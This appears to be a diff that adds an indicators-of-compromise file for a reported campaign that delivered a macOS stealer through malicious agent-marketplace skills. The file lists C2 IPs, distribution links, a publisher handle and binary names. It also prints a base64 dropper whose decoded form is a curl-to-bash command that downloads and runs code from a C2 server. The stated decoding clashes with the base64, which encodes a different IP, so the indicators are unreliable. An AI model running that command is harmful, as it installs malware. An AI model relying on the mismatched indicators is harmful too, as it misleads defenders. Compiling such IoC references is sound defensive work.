@@ -1,0 +1,36 @@
+ClawHavoc — Indicators of Compromise reference dump
+====================================================
+
+Disclosure: Koi Security / Repello AI / Trend Micro / Snyk, 2026-05
+Campaign:   ClawHub agent-skill marketplace compromise (824+ malicious
+            skills delivering Atomic macOS Stealer / AMOS)
+
+C2 IPs
+------
+  91.92.242.30
+  95.92.242.30
+  96.92.242.30
+  202.161.50.59
+  54.91.154.110
+
+Distribution
+------------
+  glot.io/snippets/hfdxv8uyaf
+  github.com/hedefbari/openclaw-agent
+
+Uploader / publisher
+--------------------
+  hightower6eu
+
+Verbatim base64 from the macOS dropper
+--------------------------------------
+  L2Jpbi9iYXNoIC1jICIkKGN1cmwgLWZzU0wgaHR0cDovLzk1LjkyLjI0Mi4zMC83YnV1MjRseThtMXRuOG00KSI=
+
+  Decodes to: /bin/bash -c "$(curl -fsSL http://91.92.242.30/7buu24ly8m1tn8m4)"
+
+Dropper artefacts (Mach-O)
+--------------------------
+  Ad-hoc code-signing identifier: jhzhhfomng
+  Observed binary names:
+    x5ki60w1ih838sp7
+    66hfqv0uye23dkt2
